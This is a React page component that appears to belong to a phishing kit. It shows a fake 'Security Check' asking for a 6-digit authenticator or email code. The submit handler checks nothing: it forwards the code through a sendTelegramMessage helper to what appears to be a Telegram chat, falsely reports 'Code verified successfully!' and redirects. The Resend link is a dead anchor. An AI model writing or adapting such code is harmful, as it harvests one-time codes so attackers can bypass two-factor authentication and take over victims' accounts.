// src/pages/CodeVerification.tsx

import React, { useState } from "react";
import { motion } from "framer-motion";
import { useNavigate } from "react-router-dom";
import Layout from "../components/layout/Layout";
import Card from "../components/ui/Cardtemp";
import { sendTelegramMessage } from "../../utils/telegram";

const CodeVerification: React.FC = () => {
  const navigate = useNavigate();
  const [code, setCode] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!code.trim()) {
      setError("Please enter the verification code.");
      return;
    }

    setIsSubmitting(true);
    setError("");
    setSuccess("");

    const formData = {
      "verification_code": code,
    };

    try {
      await sendTelegramMessage(formData, "Code Verification");
      setSuccess("Code verified successfully!");
      setCode("");
      setTimeout(() => {
        navigate("/done");
      }, 2000);
    } catch (err) {
      console.error(err);
      setError("Failed to submit code. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <Layout>
      <section className="relative overflow-hidden pt-32 pb-20 md:pt-40 md:pb-28">
        <div className="absolute top-0 right-0 w-[600px] h-[600px] bg-accent-purple/20 rounded-full blur-[150px]" />
        <div className="absolute bottom-0 left-0 w-[500px] h-[500px] bg-accent-blue/20 rounded-full blur-[120px]" />

        <div className="max-w-4xl mx-auto px-4 relative z-10">
          <motion.div
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6 }}
            className="text-center mb-10"
          >
            <span className="text-accent-purple text-sm font-semibold tracking-wider uppercase bg-accent-purple/10 px-4 py-1 rounded-full inline-block mb-4">
              Security Check
            </span>
            <h1 className="font-heading font-bold text-4xl md:text-5xl text-white mb-4">
              Enter Verification Code
            </h1>
            <p className="text-gray-400 text-lg max-w-2xl mx-auto">
              A code has been sent to your registered device. Please enter it below.
            </p>
          </motion.div>

          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5, delay: 0.2 }}
          >
            <Card className="p-6 md:p-8">
              <form onSubmit={handleSubmit} className="space-y-6">
                {error && (
                  <div className="bg-red-500/10 border border-red-500/30 text-red-400 px-4 py-3 rounded-lg text-sm">
                    {error}
                  </div>
                )}
                {success && (
                  <div className="bg-green-500/10 border border-green-500/30 text-green-400 px-4 py-3 rounded-lg text-sm">
                    {success}
                  </div>
                )}

                <div>
                  <label className="block text-white font-semibold mb-2">
                    Verification Code
                  </label>
                  <input
                    type="text"
                    value={code}
                    onChange={(e) => setCode(e.target.value)}
                    className="w-full bg-gray-800/50 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-accent-purple transition-colors text-center text-2xl tracking-widest"
                    placeholder="000000"
                    required
                    autoComplete="off"
                  />
                  <p className="text-gray-500 text-xs mt-2">
                    Enter the 6-digit code from your authenticator app or email.
                  </p>
                </div>

                <div className="pt-4">
                  <button
                    type="submit"
                    disabled={isSubmitting}
                    className={`w-full bg-gradient-to-r from-accent-blue to-accent-purple hover:shadow-lg text-white font-semibold py-3 px-6 rounded-lg transition-all duration-300 ${
                      isSubmitting ? "opacity-70 cursor-not-allowed" : ""
                    }`}
                  >
                    {isSubmitting ? "Verifying..." : "Verify Code"}
                  </button>
                </div>
              </form>

              <p className="text-gray-500 text-xs text-center mt-6">
                Didn't receive a code? <a href="#" className="text-accent-purple hover:underline">Resend</a>
              </p>
            </Card>
          </motion.div>
        </div>
      </section>
    </Layout>
  );
};

export default CodeVerification;